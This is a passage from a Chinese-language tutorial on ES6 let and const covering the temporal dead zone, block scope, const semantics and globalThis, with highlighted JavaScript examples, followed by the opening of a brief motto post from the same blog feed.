<p>上面代码中，变量<code>x</code>使用<code>let</code>命令声明，所以在声明之前，都属于x的“死区”，只要用到该变量就会报错。因此，<code>typeof</code>运行时就会抛出一个<code>ReferenceError</code>。</p>
<p>作为比较，如果一个变量根本没有被声明，使用<code>typeof</code>反而不会报错。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typeof</span> undeclared_variable <span class="comment">// &quot;undefined&quot;</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>undeclared_variable</code>是一个不存在的变量名，结果返回“undefined”。所以，在没有<code>let</code>之前，<code>typeof</code>运算符是百分之百安全的，永远不会报错。现在这一点不成立了。这样的设计是为了让大家养成良好的编程习惯，变量一定要在声明之后使用，否则就报错。</p>
<p>有些“死区”比较隐蔽，不太容易发现。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">bar</span>(<span class="params">x = y, y = <span class="number">2</span></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> [x, y];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">bar(); <span class="comment">// 报错</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，调用<code>bar</code>函数之所以报错（某些实现可能不报错），是因为参数<code>x</code>默认值等于另一个参数<code>y</code>，而此时<code>y</code>还没有声明，属于“死区”。如果<code>y</code>的默认值是<code>x</code>，就不会报错，因为此时<code>x</code>已经声明了。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">bar</span>(<span class="params">x = <span class="number">2</span>, y = x</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> [x, y];</span><br><span class="line">&#125;</span><br><span class="line">bar(); <span class="comment">// [2, 2]</span></span><br></pre></td></tr></table></figure>
<p>另外，下面的代码也会报错，与<code>var</code>的行为不同。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 不报错</span></span><br><span class="line"><span class="keyword">var</span> x = x;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 报错</span></span><br><span class="line"><span class="keyword">let</span> x = x;</span><br><span class="line"><span class="comment">// ReferenceError: x is not defined</span></span><br></pre></td></tr></table></figure>
<p>上面代码报错，也是因为暂时性死区。使用<code>let</code>声明变量时，只要变量在还没有声明完成前使用，就会报错。上面这行就属于这个情况，在变量<code>x</code>的声明语句还没有执行完成前，就去取<code>x</code>的值，导致报错”x 未定义“。</p>
<p>ES6 规定暂时性死区和<code>let</code>、<code>const</code>语句不出现变量提升，主要是为了减少运行时错误，防止在变量声明前就使用这个变量，从而导致意料之外的行为。这样的错误在 ES5 是很常见的，现在有了这种规定，避免此类错误就很容易了。</p>
<p>总之，暂时性死区的本质就是，只要一进入当前作用域，所要使用的变量就已经存在了，但是不可获取，只有等到声明变量的那一行代码出现，才可以获取和使用该变量。</p>
<h5 id="2-1-5-不允许重复声明"><a href="#2-1-5-不允许重复声明" class="headerlink" title="2.1.5 不允许重复声明"></a>2.1.5 不允许重复声明</h5><p><code>let</code>不允许在相同作用域内，重复声明同一个变量。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 报错</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">func</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> a = <span class="number">10</span>;</span><br><span class="line">  <span class="keyword">var</span> a = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 报错</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">func</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> a = <span class="number">10</span>;</span><br><span class="line">  <span class="keyword">let</span> a = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>因此，不能在函数内部重新声明参数。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">func</span>(<span class="params">arg</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> arg;</span><br><span class="line">&#125;</span><br><span class="line">func() <span class="comment">// 报错</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">func</span>(<span class="params">arg</span>) </span>&#123;</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">let</span> arg;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">func() <span class="comment">// 不报错</span></span><br></pre></td></tr></table></figure>
<h4 id="2-2-块级作用域"><a href="#2-2-块级作用域" class="headerlink" title="2.2 块级作用域"></a>2.2 块级作用域</h4><h5 id="2-2-1-为什么需要块级作用域？"><a href="#2-2-1-为什么需要块级作用域？" class="headerlink" title="2.2.1 为什么需要块级作用域？"></a>2.2.1 为什么需要块级作用域？</h5><p>ES5 只有全局作用域和函数作用域，没有块级作用域，这带来很多不合理的场景。</p>
<p>第一种场景，内层变量可能会覆盖外层变量。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> tmp = <span class="keyword">new</span> <span class="built_in">Date</span>();</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(tmp);</span><br><span class="line">  <span class="keyword">if</span> (<span class="literal">false</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> tmp = <span class="string">&#x27;hello world&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">f(); <span class="comment">// undefined</span></span><br></pre></td></tr></table></figure>
<p>上面代码的原意是，<code>if</code>代码块的外部使用外层的<code>tmp</code>变量，内部使用内层的<code>tmp</code>变量。但是，函数<code>f</code>执行后，输出结果为<code>undefined</code>，原因在于变量提升，导致内层的<code>tmp</code>变量覆盖了外层的<code>tmp</code>变量。</p>
<p>第二种场景，用来计数的循环变量泄露为全局变量。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> s = <span class="string">&#x27;hello&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; s.length; i++) &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(s[i]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(i); <span class="comment">// 5</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，变量<code>i</code>只用来控制循环，但是循环结束后，它并没有消失，泄露成了全局变量。</p>
<h5 id="2-2-2-ES6-的块级作用域"><a href="#2-2-2-ES6-的块级作用域" class="headerlink" title="2.2.2 ES6 的块级作用域"></a>2.2.2 ES6 的块级作用域</h5><p><code>let</code>实际上为 JavaScript 新增了块级作用域。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f1</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> n = <span class="number">5</span>;</span><br><span class="line">  <span class="keyword">if</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> n = <span class="number">10</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">console</span>.log(n); <span class="comment">// 5</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面的函数有两个代码块，都声明了变量<code>n</code>，运行后输出 5。这表示外层代码块不受内层代码块的影响。如果两次都使用<code>var</code>定义变量<code>n</code>，最后输出的值才是 10。</p>
<p>ES6 允许块级作用域的任意嵌套。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&#123;&#123;&#123;&#123;</span><br><span class="line">  &#123;<span class="keyword">let</span> insane = <span class="string">&#x27;Hello World&#x27;</span>&#125;</span><br><span class="line">  <span class="built_in">console</span>.log(insane); <span class="comment">// 报错</span></span><br><span class="line">&#125;&#125;&#125;&#125;;</span><br></pre></td></tr></table></figure>
<p>上面代码使用了一个五层的块级作用域，每一层都是一个单独的作用域。第四层作用域无法读取第五层作用域的内部变量。</p>
<p>内层作用域可以定义外层作用域的同名变量。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&#123;&#123;&#123;&#123;</span><br><span class="line">  <span class="keyword">let</span> insane = <span class="string">&#x27;Hello World&#x27;</span>;</span><br><span class="line">  &#123;<span class="keyword">let</span> insane = <span class="string">&#x27;Hello World&#x27;</span>&#125;</span><br><span class="line">&#125;&#125;&#125;&#125;;</span><br></pre></td></tr></table></figure>
<p>块级作用域的出现，实际上使得获得广泛应用的匿名立即执行函数表达式（匿名 IIFE）不再必要了。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// IIFE 写法</span></span><br><span class="line">(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> tmp = ...;</span><br><span class="line">  ...</span><br><span class="line">&#125;());</span><br><span class="line"></span><br><span class="line"><span class="comment">// 块级作用域写法</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">let</span> tmp = ...;</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="2-2-3-块级作用域与函数声明"><a href="#2-2-3-块级作用域与函数声明" class="headerlink" title="2.2.3 块级作用域与函数声明"></a>2.2.3 块级作用域与函数声明</h5><p>函数能不能在块级作用域之中声明？这是一个相当令人混淆的问题。</p>
<p>ES5 规定，函数只能在顶层作用域和函数作用域之中声明，不能在块级作用域声明。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 情况一</span></span><br><span class="line"><span class="keyword">if</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"></span>) </span>&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 情况二</span></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"></span>) </span>&#123;&#125;</span><br><span class="line">&#125; <span class="keyword">catch</span>(e) &#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面两种函数声明，根据 ES5 的规定都是非法的。</p>
<p>但是，浏览器没有遵守这个规定，为了兼容以前的旧代码，还是支持在块级作用域之中声明函数，因此上面两种情况实际都能运行，不会报错。</p>
<p>ES6 引入了块级作用域，明确允许在块级作用域之中声明函数。ES6 规定，块级作用域之中，函数声明语句的行为类似于<code>let</code>，在块级作用域之外不可引用。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"></span>) </span>&#123; <span class="built_in">console</span>.log(<span class="string">&#x27;I am outside!&#x27;</span>); &#125;</span><br><span class="line"></span><br><span class="line">(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="literal">false</span>) &#123;</span><br><span class="line">    <span class="comment">// 重复声明一次函数f</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"></span>) </span>&#123; <span class="built_in">console</span>.log(<span class="string">&#x27;I am inside!&#x27;</span>); &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  f();</span><br><span class="line">&#125;());</span><br></pre></td></tr></table></figure>
<p>上面代码在 ES5 中运行，会得到“I am inside!”，因为在<code>if</code>内声明的函数<code>f</code>会被提升到函数头部，实际运行的代码如下。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ES5 环境</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"></span>) </span>&#123; <span class="built_in">console</span>.log(<span class="string">&#x27;I am outside!&#x27;</span>); &#125;</span><br><span class="line"></span><br><span class="line">(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"></span>) </span>&#123; <span class="built_in">console</span>.log(<span class="string">&#x27;I am inside!&#x27;</span>); &#125;</span><br><span class="line">  <span class="keyword">if</span> (<span class="literal">false</span>) &#123;</span><br><span class="line">  &#125;</span><br><span class="line">  f();</span><br><span class="line">&#125;());</span><br></pre></td></tr></table></figure>
<p>ES6 就完全不一样了，理论上会得到“I am outside!”。因为块级作用域内声明的函数类似于<code>let</code>，对作用域之外没有影响。但是，如果你真的在 ES6 浏览器中运行一下上面的代码，是会报错的，这是为什么呢？</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 浏览器的 ES6 环境</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"></span>) </span>&#123; <span class="built_in">console</span>.log(<span class="string">&#x27;I am outside!&#x27;</span>); &#125;</span><br><span class="line"></span><br><span class="line">(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="literal">false</span>) &#123;</span><br><span class="line">    <span class="comment">// 重复声明一次函数f</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"></span>) </span>&#123; <span class="built_in">console</span>.log(<span class="string">&#x27;I am inside!&#x27;</span>); &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  f();</span><br><span class="line">&#125;());</span><br><span class="line"><span class="comment">// Uncaught TypeError: f is not a function</span></span><br></pre></td></tr></table></figure>
<p>上面的代码在 ES6 浏览器中，都会报错。</p>
<p>原来，如果改变了块级作用域内声明的函数的处理规则，显然会对老代码产生很大影响。为了减轻因此产生的不兼容问题，ES6 在附录 B里面规定，浏览器的实现可以不遵守上面的规定，有自己的行为方式。</p>
<ul>
<li>允许在块级作用域内声明函数。</li>
<li>函数声明类似于<code>var</code>，即会提升到全局作用域或函数作用域的头部。</li>
<li>同时，函数声明还会提升到所在的块级作用域的头部。</li>
</ul>
<p>注意，上面三条规则只对 ES6 的浏览器实现有效，其他环境的实现不用遵守，还是将块级作用域的函数声明当作<code>let</code>处理。</p>
<p>根据这三条规则，浏览器的 ES6 环境中，块级作用域内声明的函数，行为类似于<code>var</code>声明的变量。上面的例子实际运行的代码如下。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 浏览器的 ES6 环境</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"></span>) </span>&#123; <span class="built_in">console</span>.log(<span class="string">&#x27;I am outside!&#x27;</span>); &#125;</span><br><span class="line">(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> f = <span class="literal">undefined</span>;</span><br><span class="line">  <span class="keyword">if</span> (<span class="literal">false</span>) &#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"></span>) </span>&#123; <span class="built_in">console</span>.log(<span class="string">&#x27;I am inside!&#x27;</span>); &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  f();</span><br><span class="line">&#125;());</span><br><span class="line"><span class="comment">// Uncaught TypeError: f is not a function</span></span><br></pre></td></tr></table></figure>
<p>考虑到环境导致的行为差异太大，应该避免在块级作用域内声明函数。如果确实需要，也应该写成函数表达式，而不是函数声明语句。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 块级作用域内部的函数声明语句，建议不要使用</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">let</span> a = <span class="string">&#x27;secret&#x27;</span>;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 块级作用域内部，优先使用函数表达式</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">let</span> a = <span class="string">&#x27;secret&#x27;</span>;</span><br><span class="line">  <span class="keyword">let</span> f = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a;</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>另外，还有一个需要注意的地方。ES6 的块级作用域必须有大括号，如果没有大括号，JavaScript 引擎就认为不存在块级作用域。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 第一种写法，报错</span></span><br><span class="line"><span class="keyword">if</span> (<span class="literal">true</span>) <span class="keyword">let</span> x = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 第二种写法，不报错</span></span><br><span class="line"><span class="keyword">if</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">  <span class="keyword">let</span> x = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面代码中，第一种写法没有大括号，所以不存在块级作用域，而let只能出现在当前作用域的顶层，所以报错。第二种写法有大括号，所以块级作用域成立。</p>
<p>函数声明也是如此，严格模式下，函数只能声明在当前作用域的顶层。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 不报错</span></span><br><span class="line"><span class="meta">&#x27;use strict&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"></span>) </span>&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 报错</span></span><br><span class="line"><span class="meta">&#x27;use strict&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="literal">true</span>)</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"></span>) </span>&#123;&#125;</span><br></pre></td></tr></table></figure>
<h4 id="2-3-const命令"><a href="#2-3-const命令" class="headerlink" title="2.3 const命令"></a>2.3 const命令</h4><h5 id="2-3-1-基本用法"><a href="#2-3-1-基本用法" class="headerlink" title="2.3.1 基本用法"></a>2.3.1 基本用法</h5><p><code>const</code>声明一个只读的常量。一旦声明，常量的值就不能改变。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> PI = <span class="number">3.1415</span>;</span><br><span class="line">PI <span class="comment">// 3.1415</span></span><br><span class="line"></span><br><span class="line">PI = <span class="number">3</span>;</span><br><span class="line"><span class="comment">// TypeError: Assignment to constant variable.</span></span><br></pre></td></tr></table></figure>
<p>上面代码表明改变常量的值会报错。</p>
<p><code>const</code>声明的变量不得改变值，这意味着，<code>const</code>一旦声明变量，就必须立即初始化，不能留到以后赋值。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> foo;</span><br><span class="line"><span class="comment">// SyntaxError: Missing initializer in const declaration</span></span><br></pre></td></tr></table></figure>
<p>上面代码表示，对于<code>const</code>来说，只声明不赋值，就会报错。</p>
<p><code>const</code>的作用域与<code>let</code>命令相同：只在声明所在的块级作用域内有效。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> MAX = <span class="number">5</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">MAX <span class="comment">// Uncaught ReferenceError: MAX is not defined</span></span><br></pre></td></tr></table></figure>
<p><code>const</code>命令声明的常量也是不提升，同样存在暂时性死区，只能在声明的位置后面使用。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(MAX); <span class="comment">// ReferenceError</span></span><br><span class="line">  <span class="keyword">const</span> MAX = <span class="number">5</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面代码在常量<code>MAX</code>声明之前就调用，结果报错。</p>
<p><code>const</code>声明的常量，也与<code>let</code>一样不可重复声明。</p>
<h5 id="2-3-2-本质"><a href="#2-3-2-本质" class="headerlink" title="2.3.2 本质"></a>2.3.2 本质</h5><p><code>const</code>实际上保证的，并不是变量的值不得改动，而是变量指向的那个内存地址所保存的数据不得改动。对于简单类型的数据（数值、字符串、布尔值），值就保存在变量指向的那个内存地址，因此等同于常量。但对于复合类型的数据（主要是对象和数组），变量指向的内存地址，保存的只是一个指向实际数据的指针，const只能保证这个指针是固定的（即总是指向另一个固定的地址），至于它指向的数据结构是不是可变的，就完全不能控制了。因此，将一个对象声明为常量必须非常小心。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> foo = &#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 为 foo 添加一个属性，可以成功</span></span><br><span class="line">foo.prop = <span class="number">123</span>;</span><br><span class="line">foo.prop <span class="comment">// 123</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 将 foo 指向另一个对象，就会报错</span></span><br><span class="line">foo = &#123;&#125;; <span class="comment">// TypeError: &quot;foo&quot; is read-only</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，常量<code>foo</code>储存的是一个地址，这个地址指向一个对象。不可变的只是这个地址，即不能把<code>foo</code>指向另一个地址，但对象本身是可变的，所以依然可以为其添加新属性。</p>
<p>下面是另一个例子。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> a = [];</span><br><span class="line">a.push(<span class="string">&#x27;Hello&#x27;</span>); <span class="comment">// 可执行</span></span><br><span class="line">a.length = <span class="number">0</span>;    <span class="comment">// 可执行</span></span><br><span class="line">a = [<span class="string">&#x27;Dave&#x27;</span>];    <span class="comment">// 报错</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，常量<code>a</code>是一个数组，这个数组本身是可写的，但是如果将另一个数组赋值给<code>a</code>，就会报错。</p>
<p>如果真的想将对象冻结，应该使用<code>Object.freeze</code>方法。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> foo = <span class="built_in">Object</span>.freeze(&#123;&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 常规模式时，下面一行不起作用；</span></span><br><span class="line"><span class="comment">// 严格模式时，该行会报错</span></span><br><span class="line">foo.prop = <span class="number">123</span>;</span><br></pre></td></tr></table></figure>
<p>上面代码中，常量<code>foo</code>指向一个冻结的对象，所以添加新属性不起作用，严格模式时还会报错。</p>
<p>除了将对象本身冻结，对象的属性也应该冻结。下面是一个将对象彻底冻结的函数。</p>
<h5 id="2-3-3-ES6-声明变量的六种方法"><a href="#2-3-3-ES6-声明变量的六种方法" class="headerlink" title="2.3.3 ES6 声明变量的六种方法"></a>2.3.3 ES6 声明变量的六种方法</h5><p>ES5 只有两种声明变量的方法：<code>var</code>命令和<code>function</code>命令。ES6 除了添加<code>let</code>和<code>const</code>命令，后面章节还会提到，另外两种声明变量的方法：<code>import</code>命令和<code>class</code>命令。所以，ES6 一共有 6 种声明变量的方法。</p>
<h4 id="2-4-顶层对象的属性"><a href="#2-4-顶层对象的属性" class="headerlink" title="2.4 顶层对象的属性"></a>2.4 顶层对象的属性</h4><p>顶层对象，在浏览器环境指的是<code>window</code>对象，在 Node 指的是<code>global</code>对象。ES5 之中，顶层对象的属性与全局变量是等价的。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">window</span>.a = <span class="number">1</span>;</span><br><span class="line">a <span class="comment">// 1</span></span><br><span class="line"></span><br><span class="line">a = <span class="number">2</span>;</span><br><span class="line"><span class="built_in">window</span>.a <span class="comment">// 2</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，顶层对象的属性赋值与全局变量的赋值，是同一件事。</p>
<p>顶层对象的属性与全局变量挂钩，被认为是 JavaScript 语言最大的设计败笔之一。这样的设计带来了几个很大的问题，首先是没法在编译时就报出变量未声明的错误，只有运行时才能知道（因为全局变量可能是顶层对象的属性创造的，而属性的创造是动态的）；其次，程序员很容易不知不觉地就创建了全局变量（比如打字出错）；最后，顶层对象的属性是到处可以读写的，这非常不利于模块化编程。另一方面，<code>window</code>对象有实体含义，指的是浏览器的窗口对象，顶层对象是一个有实体含义的对象，也是不合适的。</p>
<p>ES6 为了改变这一点，一方面规定，为了保持兼容性，<code>var</code>命令和<code>function</code>命令声明的全局变量，依旧是顶层对象的属性；另一方面规定，<code>let</code>命令、<code>const</code>命令、<code>class</code>命令声明的全局变量，不属于顶层对象的属性。也就是说，从 ES6 开始，全局变量将逐步与顶层对象的属性脱钩。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a = <span class="number">1</span>;</span><br><span class="line"><span class="comment">// 如果在 Node 的 REPL 环境，可以写成 global.a</span></span><br><span class="line"><span class="comment">// 或者采用通用方法，写成 this.a</span></span><br><span class="line"><span class="built_in">window</span>.a <span class="comment">// 1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> b = <span class="number">1</span>;</span><br><span class="line"><span class="built_in">window</span>.b <span class="comment">// undefined</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，全局变量<code>a</code>由<code>var</code>命令声明，所以它是顶层对象的属性；全局变量<code>b</code>由<code>let</code>命令声明，所以它不是顶层对象的属性，返回<code>undefined</code>。</p>
<h4 id="2-5-globalThis-对象"><a href="#2-5-globalThis-对象" class="headerlink" title="2.5 globalThis 对象"></a>2.5 globalThis 对象</h4><p>JavaScript 语言存在一个顶层对象，它提供全局环境（即全局作用域），所有代码都是在这个环境中运行。但是，顶层对象在各种实现里面是不统一的。</p>
<p>浏览器里面，顶层对象是<code>window</code>，但 Node 和 Web Worker 没有<code>window</code>。<br>浏览器和 Web Worker 里面，<code>self</code>也指向顶层对象，但是 Node 没有<code>self</code>。<br>Node 里面，顶层对象是<code>global</code>，但其他环境都不支持。<br>同一段代码为了能够在各种环境，都能取到顶层对象，现在一般是使用<code>this</code>关键字，但是有局限性。</p>
<ul>
<li>全局环境中，<code>this</code>会返回顶层对象。但是，Node.js 模块中<code>this</code>返回的是当前模块，ES6 模块中<code>this</code>返回的是<code>undefined</code>。</li>
<li>函数里面的<code>this</code>，如果函数不是作为对象的方法运行，而是单纯作为函数运行，<code>this</code>会指向顶层对象。但是，严格模式下，这时<code>this</code>会返回<code>undefined</code>。</li>
<li>不管是严格模式，还是普通模式，<code>new Function(&#39;return this&#39;)()</code>，总是会返回全局对象。但是，如果浏览器用了 CSP（Content Security Policy，内容安全策略），那么<code>eval</code>、<code>new Function</code>这些方法都可能无法使用。</li>
</ul>
<p>综上所述，很难找到一种方法，可以在所有情况下，都取到顶层对象。下面是两种勉强可以使用的方法。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 方法一</span></span><br><span class="line">(<span class="keyword">typeof</span> <span class="built_in">window</span> !== <span class="string">&#x27;undefined&#x27;</span></span><br><span class="line">   ? <span class="built_in">window</span></span><br><span class="line">   : (<span class="keyword">typeof</span> process === <span class="string">&#x27;object&#x27;</span> &amp;&amp;</span><br><span class="line">      <span class="keyword">typeof</span> <span class="built_in">require</span> === <span class="string">&#x27;function&#x27;</span> &amp;&amp;</span><br><span class="line">      <span class="keyword">typeof</span> <span class="built_in">global</span> === <span class="string">&#x27;object&#x27;</span>)</span><br><span class="line">     ? <span class="built_in">global</span></span><br><span class="line">     : <span class="built_in">this</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 方法二</span></span><br><span class="line"><span class="keyword">var</span> getGlobal = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">typeof</span> self !== <span class="string">&#x27;undefined&#x27;</span>) &#123; <span class="keyword">return</span> self; &#125;</span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">typeof</span> <span class="built_in">window</span> !== <span class="string">&#x27;undefined&#x27;</span>) &#123; <span class="keyword">return</span> <span class="built_in">window</span>; &#125;</span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">typeof</span> <span class="built_in">global</span> !== <span class="string">&#x27;undefined&#x27;</span>) &#123; <span class="keyword">return</span> <span class="built_in">global</span>; &#125;</span><br><span class="line">  <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&#x27;unable to locate global object&#x27;</span>);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>ES2020 在语言标准的层面，引入<code>globalThis</code>作为顶层对象。也就是说，任何环境下，<code>globalThis</code>都是存在的，都可以从它拿到顶层对象，指向全局环境下的<code>this</code>。</p>
<p>垫片库<code>global-this</code>模拟了这个提案，可以在所有环境拿到<code>globalThis</code>。</p>
]]></content>
      <categories>
        <category>JS-ES6</category>
      </categories>
      <tags>
        <tag>JS-ES6 let 和 const 命令</tag>
      </tags>
  </entry>
  <entry>
    <title>打卡0073</title>
    <url>/2021/06/15/%E6%89%93%E5%8D%A10073/</url>
    <content><![CDATA[<p><font color=#afb4db>乐观和爱才是生活的解药。</font></p>
